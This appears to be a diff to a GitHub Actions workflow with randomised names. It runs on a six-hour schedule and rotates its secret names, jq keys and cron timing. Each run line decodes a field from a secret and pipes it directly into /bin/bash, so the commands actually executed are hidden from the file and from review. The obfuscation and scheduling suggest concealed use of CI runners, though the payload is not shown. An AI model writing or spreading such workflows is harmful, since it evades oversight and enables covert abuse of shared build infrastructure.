@@ -3,8 +3,8 @@ name: surmiseblouse
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 2/6 * * *'
-jobs:  # 31670
+    - cron: '14 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,14 +12,13 @@ jobs:  # 31670
       - uses: actions/checkout@v4
       - name: surmiseblouse
         env:
-          rlvmu41388: ${{ secrets.rlvmu41388 }}
+          wrod383: ${{ secrets.wrod383 }}
         run: |
-          echo $rlvmu41388 | jq -r .t01 | /bin/bash
-          echo $whw63647 | jq -r .z845 | /bin/bash
-          echo $yqlss9231 | jq -r .cqz8 | /bin/bash
-          echo $izo943 | jq -r .a81 | /bin/bash
-          echo $qxqy2 | jq -r .jvvp7 | /bin/bash
-          echo $tolxe01 | jq -r .ve74 | /bin/bash
-          echo $xoyr51 | jq -r .v8 | /bin/bash
-          echo $upxm43418 | jq -r .o8 | /bin/bash
+          echo $wrod383 | jq -r .xxpm411 | /bin/bash
+          echo $cra9388 | jq -r .ncxvx950 | /bin/bash
+          echo $del2451 | jq -r .fgigj2 | /bin/bash
+          echo $bt9447 | jq -r .pcod020 | /bin/bash
+          echo $azjkl0 | jq -r .fox3547 | /bin/bash
+          echo $huxup78 | jq -r .o8 | /bin/bash
+          echo $db943 | jq -r .sqxd63 | /bin/bash
 
